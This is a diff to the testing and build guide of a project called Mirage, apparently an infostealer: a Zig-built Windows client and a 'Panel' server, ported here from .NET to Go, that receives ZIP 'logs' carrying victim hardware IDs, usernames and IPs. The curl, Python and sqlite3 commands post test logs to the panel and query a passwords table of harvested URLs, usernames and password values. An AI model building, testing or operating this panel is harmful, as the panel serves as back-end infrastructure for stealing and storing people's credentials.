@@ -157,19 +157,19 @@ What it tests: CRC32 computation, file header structure, central directory, EOCD
 Test that the Panel correctly receives, parses, and stores a log:
 
 ```bash
-# 1. Start the Panel (opens on port 5000)
+# 1. Start the Panel (opens on port 8080)
 cd Mirage.Panel
-dotnet run
+go run ./cmd/panel
 
 # 2. Send a test ZIP via curl
-curl -X POST http://127.0.0.1:5000/api/log \
-  -H "Authorization: Bearer <auth-token>" \
+curl -X POST http://127.0.0.1:8080/api/log \
+  -H "Authorization: Bearer YOUR_AUTH_TOKEN" \
   -F "archive=@test_log.zip" \
   -F 'metadata={"hwid":"TEST-HWID","os":"Windows 10","username":"test","ip":"127.0.0.1"}'
 
 # 3. Verify in database
-sqlite3 mirage_panel.db "SELECT COUNT(*) FROM sessions;"
-sqlite3 mirage_panel.db "SELECT * FROM passwords;"
+sqlite3 data/mirage.db "SELECT COUNT(*) FROM sessions;"
+sqlite3 data/mirage.db "SELECT * FROM passwords;"
 ```
 
 ### 3.1 Test ZIP Structure
@@ -294,7 +294,7 @@ with zipfile.ZipFile(buf, 'w') as z:
 buf.seek(0)
 
 r = requests.post(
-    'http://127.0.0.1:5000/api/log',
+    'http://127.0.0.1:8080/api/log',
     files={'archive': ('test.zip', buf, 'application/zip')},
     data={'metadata': '{\"hwid\":\"TEST\",\"os\":\"Win10\",\"username\":\"tester\",\"ip\":\"1.2.3.4\"}'},
     headers={'Authorization': 'Bearer <token>'}
@@ -306,8 +306,8 @@ print(r.status_code)  # Expected: 200
 ### 6.2 What to Verify
 
 1. Panel logs show `POST /api/log 200`
-2. `mirage_panel.db` contains new row in `sessions`
-3. `mirage_panel.db` contains password in `passwords` table
+2. `data/mirage.db` contains new row in `sessions`
+3. `data/mirage.db` contains password in `passwords` table
 4. `GET /api/stats` reflects new data
 5. Archive saved to `logs/` directory
 
@@ -402,17 +402,18 @@ zig build -Dtarget=x86_64-windows -Doptimize=Debug
 zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall
 
 # Build Panel
-dotnet build
-dotnet run                  # starts server on port 5000
+cd Mirage.Panel
+go build -o panel.exe ./cmd/panel
+./panel.exe                  # starts server on port 8080
 
 # Send test log
-curl -X POST http://127.0.0.1:5000/api/log \
+curl -X POST http://127.0.0.1:8080/api/log \
   -H "Authorization: Bearer <token>" \
   -F "archive=@test.zip" \
   -F 'metadata={"hwid":"TEST","os":"Win10"}'
 
 # Verify database
-sqlite3 mirage_panel.db ".tables"
-sqlite3 mirage_panel.db "SELECT COUNT(*) FROM sessions;"
-sqlite3 mirage_panel.db "SELECT url, username, password_value FROM passwords LIMIT 10;"
+sqlite3 data/mirage.db ".tables"
+sqlite3 data/mirage.db "SELECT COUNT(*) FROM sessions;"
+sqlite3 data/mirage.db "SELECT url, username, password_value FROM passwords LIMIT 10;"
 ```
